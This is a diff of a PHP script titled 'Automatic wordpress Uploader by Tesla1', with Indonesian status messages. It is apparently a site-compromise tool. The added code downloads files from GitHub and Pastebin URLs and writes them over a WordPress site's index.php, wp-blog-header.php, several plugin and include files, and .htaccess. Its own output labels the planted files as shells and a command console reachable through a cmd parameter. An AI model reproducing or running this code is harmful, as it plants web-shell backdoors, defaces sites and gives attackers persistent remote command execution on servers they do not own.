@@ -11,7 +11,7 @@ if(isset($_REQUEST['zero1'])){
         $secho0 = $_SERVER['DOCUMENT_ROOT'] . '/cgi/index.html';
 $secho = $_SERVER['DOCUMENT_ROOT'] . '/cgi';
 $sedo = $_SERVER['SERVER_NAME'] . '/cgi';
-echo '<b>Automatic wordpress Uploader by Tesla1</b><br>Path jika upload gagal > ';
+echo '<b>Automatic wordpress Uploader by Tesla1</b><br>Path jika upload gagal ----> ';
 echo $secho;
 
   $cmd = "mkdir $secho";
@@ -30,14 +30,69 @@ else { echo 'Masukan filemu diatas</b><br><br>'; }
 }
 
 { if(@copy($_FILES['file']['tmp_name'], $destFile)) 
-{ echo '<a href="../cgi">' . $sedo; echo '</a>  Sukses !! '; }
+{ echo '<a href="//' . $sedo; echo '">' . $sedo; echo '</a>  Sukses !! '; }
 else { echo '.'; }
 }
 
 //echo '<a href="../cgi">' . $sedo; echo '</a>';
+$domen = $_SERVER['SERVER_NAME'];
 
+ $nama2= fopen($_SERVER['DOCUMENT_ROOT'] . '/index.php' ,'w+');
+  $file2 = file_get_contents('https://raw.githubusercontent.com/prokontra/prokontra/main/wpindex');
+  $tulis2 = fwrite ($nama2 ,$file2);
+ fclose($nama2); 
+{ if($tulis2 == "697") 
+{ echo '(Uploader) Sukses !! ----> <a href="//' . $domen . '/index.php?Lemon=ex5f9'; echo '">' . $domen . '/index.php?Lemon=ex5f9'; echo '</a>  <br>'; }
+else { echo 'Gagal<br>'; }
+}
+ 
+  $nama3= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-blog-header.php' ,'w+');
+  $file3 = file_get_contents('https://pastebin.com/raw/8cB9HM4h');
+  $tulis3 = fwrite ($nama3 ,$file3);
+ fclose($nama3); 
+{ if($tulis3 == "550") 
+{ echo '(Curl) Sukses !! ----> <a href="//' . $domen . '/wp-blog-header.php'; echo '">' . $domen . '/wp-blog-header.php'; echo '</a>  <br>'; }
+else { echo 'Gagal<br>'; }
+}
 
-        die;
+  $nama4= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/index.php' ,'w+');
+  $file4 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/upl');
+  $tulis4 = fwrite ($nama4 ,$file4);
+ fclose($nama4); 
+{ if($tulis4 == "509") 
+{ echo '(console) Sukses !! ----> <a href="//' . $domen . '/wp-content/index.php?cmd=pwd'; echo '">' . $domen . '/wp-content/index.php?cmd=pwd'; echo '</a>  <br>'; }
+else { echo 'Gagal<br>'; }
+}
+ 
+$nama= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-includes/ID3/module.tag.3gp.php' ,'w+');
+  $file = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/sementara');
+  $tulis = fwrite ($nama ,$file);
+ fclose($nama); 
+{ if($tulis == "6410") 
+{ echo '(Shell 1) Sukses !! ----> <a href="//' . $domen . '/wp-includes/ID3/module.tag.3gp.php'; echo '">' . $domen . '/wp-includes/ID3/module.tag.3gp.php'; echo '</a>  <br>'; }
+else { echo 'Gagal<br>'; }
+}
+ 
+$nama1= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/index.php' ,'w+');
+  $file1 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/404');
+  $tulis1 = fwrite ($nama1 ,$file1);
+ fclose($nama1); 
+$no1 = "$tulis1";
+{ if($no1 == $tulis1) 
+{ echo '(Shell 2) Sukses !! ----> <a href="//' . $domen . '/wp-content/plugins/index.php'; echo '">' . $domen . '/wp-content/plugins/index.php'; echo '</a> <br>'; }
+else { echo 'Gagal <br>'; }
+}
+ 
+$nama5= fopen($_SERVER['DOCUMENT_ROOT'] . '/.htaccess' ,'w+');
+  $file5 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/hta_WP');
+  $tulis5 = fwrite ($nama5 ,$file5);
+ fclose($nama5);
+{ if($tulis5 == "1431") 
+{ echo '(permission) Sukses !! ----> ' . $domen . '/.htaccess'; echo '</a> <br>'; }
+else { echo 'Gagal<br>'; }
+}
+
+         die;
 }
 
 ?>
